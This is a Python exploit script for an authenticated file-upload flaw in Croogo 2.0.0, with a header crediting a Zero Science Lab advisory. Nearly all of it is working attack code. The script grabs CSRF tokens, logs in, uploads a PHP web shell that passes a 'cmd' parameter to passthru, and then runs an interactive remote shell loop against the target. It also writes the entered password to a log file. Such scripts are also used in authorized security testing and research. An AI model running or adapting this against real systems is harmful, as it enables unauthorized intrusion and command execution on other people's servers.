#!/usr/bin/env python
#
#
# Croogo 2.0.0 Arbitrary PHP Code Execution Exploit
#
#
# Vendor: Fahad Ibnay Heylaal
# Product web page: http://www.croogo.org
# Affected version: 2.0.0
#
# Summary: Croogo is a free, open source, content management system
# for PHP, released under The MIT License. It is powered by CakePHP
# MVC framework.
#
# Desc: Croogo suffers from an authenticated arbitrary PHP code
# execution. The vulnerability is caused due to the improper
# verification of uploaded files in 
'/admin/file_manager/attachments/add'
# script thru the 'data[Attachment][file]' POST parameter and in
# '/admin/file_manager/file_manager/upload' script thru the
# 'data[FileManager][file]' POST parameter. This can be exploited
# to execute arbitrary PHP code by uploading a malicious PHP script
# file that will be stored in '/webroot/uploads/' directory.
#
# Tested on: Apache/2.4.7 (Win32)
#            PHP/5.5.6
#            MySQL 5.6.14
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# Zero Science Lab - http://www.zeroscience.mk
# Macedonian Information Security Research And Development Laboratory
#
#
# Advisory ID: ZSL-2014-5202
# Advisory URL: 
http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5202.php
#
# Vendor: http://blog.croogo.org/blog/croogo-210-released
#
#
# 26.07.2014
#
#

version = '5.0.0.251'

import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import logging, os, time, datetime, re

from colorama import Fore, Back, Style, init
from cStringIO import StringIO
from urllib2 import URLError

init()

if os.name == 'posix': os.system('clear')
if os.name == 'nt': os.system('cls')
piton = os.path.basename(sys.argv[0])

def bannerche():
	print '''
 @---------------------------------------------------------------@
 |                                                               |
 |       Croogo 2.0.0 Arbitrary PHP Code Execution Exploit       |
 |                                                               |
 |                                                               |
 |                       ID: ZSL-2014-5202                       |
 |                                                               |
 |              Copyleft (c) 2014, Zero Science Lab              |
 |                                                               |
 @---------------------------------------------------------------@
          '''
	if len(sys.argv) < 3:
		print '\n\x20\x20[*] '+Fore.YELLOW+'Usage: 
'+Fore.RESET+piton+' <hostname> <path>\n'
		print '\x20\x20[*] '+Fore.CYAN+'Example: 
'+Fore.RESET+piton+' zeroscience.mk croogo\n'
		sys.exit()

bannerche()

print '\n\x20\x20[*] Initialising exploit 
'+'.'*34+Fore.GREEN+'[OK]'+Fore.RESET

host = sys.argv[1]
path = sys.argv[2]

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

try:
	getcsrf = 
opener.open('http://'+host+'/'+path+'/admin/users/users/login')
	csrf = getcsrf.read()
except urllib2.HTTPError, errorzio:
	if errorzio.code == 404:
		print '\x20\x20[*] Checking path 
'+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your path 
entry.'+Fore.RESET
		print
		sys.exit()
except URLError, errorziocvaj:
	if errorziocvaj.reason:
		print '\x20\x20[*] Checking host 
'+'.'*41+Fore.RED+'[ER]'+Fore.RESET
		print '\x20\x20[*] '+Fore.YELLOW+'Check your hostname 
entry.'+Fore.RESET
		print
		sys.exit()

print '\x20\x20[*] Checking host and path 
'+'.'*32+Fore.GREEN+'[OK]'+Fore.RESET

token_key = re.search(r'\[key\]\" value=\"(.+?)\"', csrf).group(1)
print '\x20\x20[*] Retrieving login CSRF token 
'+'.'*27+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Login CSRF token: '+Fore.YELLOW+token_key+Fore.RESET

print '\x20\x20[*] Login please.'

username = raw_input('\x20\x20[*] Enter username: ')
password = raw_input('\x20\x20[*] Enter password: ')


login_data = urllib.urlencode({
							'_method' : 
'POST',
							
'data[User][password]' : password,
							
'data[User][remember]' : '0',
							
'data[User][username]' : username,
							
'data[_Token][fields]' : '93365ba06ce101995d3cd9c79cce968b12fb6ee5:',
							
'data[_Token][key]' : token_key,
							
'data[_Token][unlocked]' : ''
							})


login = opener.open('http://'+host+'/'+path+'/admin/users/users/login', 
login_data)
auth = login.read()

for session in cj:
	sessid = session.name

print '\x20\x20[*] Mapping session ID 
'+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
ses_chk = re.search(r'%s=\w+' % sessid , str(cj))
cookie = ses_chk.group(0)
print '\x20\x20[*] Cookie: '+Fore.YELLOW+cookie+Fore.RESET

if re.search(r'Incorrect username or password', auth):
	print '\x20\x20[*] Incorrect username or password 
'+'.'*24+Fore.RED+'[ER]'+Fore.RESET
	print
	sys.exit()
else:
	print '\x20\x20[*] Authenticated 
'+'.'*41+Fore.GREEN+'[OK]'+Fore.RESET

getcsrfattach = 
opener.open('http://'+host+'/'+path+'/admin/file_manager/attachments/add')
csrfattach = getcsrfattach.read()
token_key2 = re.search(r'\[key\]\" value=\"(.+?)\"', 
csrfattach).group(1)
print '\x20\x20[*] Retrieving upload CSRF token 
'+'.'*26+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Upload CSRF token: 
'+Fore.YELLOW+token_key2+Fore.RESET

class MultiPartForm(object):

    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
    
    def get_content_type(self):
        return 'multipart/form-data; boundary=%s' % self.boundary

    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or 
'application/octet-stream'
        self.files.append((fieldname, filename, mimetype, body))
        return
    
    def __str__(self):

        parts = []
        part_boundary = '--' + self.boundary
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: form-data; name="%s"' % name,
              '',
              value,
            ]
            for name, value in self.form_fields
            )
        
        parts.extend(
            [ part_boundary,
              'Content-Disposition: file; name="%s"; filename="%s"' % \
                 (field_name, filename),
              'Content-Type: %s' % content_type,
              '',
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
        
        flattened = list(itertools.chain(*parts))
        flattened.append('--' + self.boundary + '--')
        flattened.append('')
        return '\r\n'.join(flattened)

if __name__ == '__main__':

    form = MultiPartForm()
    form.add_field('_method', 'POST')
    form.add_field('data[_Token][key]', token_key2)
    form.add_field('data[_Token][fields]', 
'c0c3f5d102d9672429f5c571a5f45c34255a93a9%3A')
    form.add_field('data[_Token][unlocked]', '')
    
    form.add_file('data[Attachment][file]', 'zsl.php', 
                  fileHandle=StringIO('<?php echo \"<pre>\"; 
passthru($_GET[\'cmd\']); echo \"</pre>\"; ?>'))

    request = 
urllib2.Request('http://'+host+'/'+path+'/admin/file_manager/attachments/add')
    request.add_header('User-agent', 'joxypoxy 5.0')
    body = str(form)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Cookie', cookie)
    request.add_header('Content-length', len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
    print '\x20\x20[*] Sending payload 
'+'.'*39+Fore.GREEN+'[OK]'+Fore.RESET


print '\x20\x20[*] Starting logging service 
'+'.'*30+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Spawning shell '+'.'*40+Fore.GREEN+'[OK]'+Fore.RESET
time.sleep(1)

furl = '/uploads/zsl.php'
#furl = '/webroot/uploads/zsl.php'

print
today = datetime.date.today()
fname = 
'croogo-'+today.strftime('%d-%b-%Y')+time.strftime('_%H%M%S')+'.log'
logging.basicConfig(filename=fname,level=logging.DEBUG)

logging.info(' '+'+'*75)
logging.info(' +')
logging.info(' + Log started: '+today.strftime('%A, 
%d-%b-%Y')+time.strftime(', %H:%M:%S'))
logging.info(' + Title: Croogo 2.0.0 Arbitrary PHP Code Execution 
Exploit')
logging.info(' + Python program executed: '+sys.argv[0])
logging.info(' + Version: '+version)
logging.info(' + Full query: \''+piton+'\x20'+host+'\'')
logging.info(' + Username input: '+username)
logging.info(' + Password input: '+password)
logging.info(' + Vector: '+'http://'+host+'/'+path+furl)
logging.info(' +')
logging.info(' + Advisory ID: ZSL-2014-5202')
logging.info(' + Zero Science Lab - http://www.zeroscience.mk')
logging.info(' +')
logging.info(' '+'+'*75+'\n')

print Style.DIM+Fore.CYAN+'\x20\x20[*] Press [ ENTER ] to INSERT 
COIN!\n'+Style.RESET_ALL+Fore.RESET
raw_input()
while True:
	try:
		cmd = raw_input(Fore.RED+'shell@'+host+':~# 
'+Fore.RESET)
		execute = 
opener.open('http://'+host+'/'+path+furl+'?cmd='+urllib.quote(cmd))
		reverse = execute.read()
		pattern = re.compile(r'<pre>(.*?)</pre>',re.S|re.M)

		print Style.BRIGHT+Fore.CYAN
		cmdout = pattern.match(reverse)
		print cmdout.groups()[0].strip()
		print Style.RESET_ALL+Fore.RESET

		if cmd.strip() == 'exit':
			break

		logging.info('Command executed: '+cmd+'\n\nOutput: 
\n'+'='*8+'\n\n'+cmdout.groups()[0].strip()+'\n\n'+'-'*60+'\n')
	except Exception:
		break

logging.warning('\n\nLog ended: '+today.strftime('%A, 
%d-%b-%Y')+time.strftime(', %H:%M:%S')+'\n\nEND OF LOG')
print '\x20\x20[*] Carpe commentarius 
'+'.'*36+Fore.GREEN+'[OK]'+Fore.RESET
print '\x20\x20[*] Log file: '+Fore.YELLOW+fname+Fore.RESET
print

sys.exit()
